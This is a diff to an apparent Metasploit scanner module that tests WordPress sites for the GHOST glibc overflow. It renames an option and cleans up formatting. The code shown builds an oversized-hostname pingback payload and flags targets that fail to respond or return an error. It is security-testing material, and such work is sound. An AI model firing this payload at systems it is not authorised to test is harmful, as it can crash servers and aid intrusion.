@@ -39,12 +39,12 @@ class Metasploit3 < Msf::Auxiliary
 
     register_options(
     [
-      OptInt.new('COUNT', [false, 'Number of iterations', 2500]),
+      OptInt.new('LENGTH', [false, 'Payload length', 2500]),
     ], self.class)
   end
 
-  def count
-    datastore['COUNT']
+  def length
+    datastore['LENGTH']
   end
 
   def generate_pingback_xml(target, valid_blog_post)
@@ -62,7 +62,7 @@ class Metasploit3 < Msf::Auxiliary
       return
     end
 
-    ghost = "0" * count
+    ghost = "0" * length
     payload = "http://#{ghost}/#{Rex::Text.rand_text_alpha(7)}.php"
     xml = wordpress_generate_xml_rpc_body('pingback.ping', payload, payload)
 
@@ -76,12 +76,12 @@ class Metasploit3 < Msf::Auxiliary
     if res.nil? || res.code == 500
       print_good("#{peer} - vulnerable to GHOST")
       report_vuln(
-      :host		=> ip,
-      :proto	=> 'tcp',
-      :port		=> datastore['RPORT'],
-      :name		=> self.name,
-      :info		=> "Module #{self.fullname} found GHOST vulnerability",
-      :sname	=> datastore['SSL'] ? "https" : "http"
+      :host   => ip,
+      :proto  => 'tcp',
+      :port   => datastore['RPORT'],
+      :name   => self.name,
+      :info   => "Module #{self.fullname} found GHOST vulnerability",
+      :sname  => datastore['SSL'] ? "https" : "http"
       )
     else
       print_status("#{peer} - target not vulnerable to GHOST")
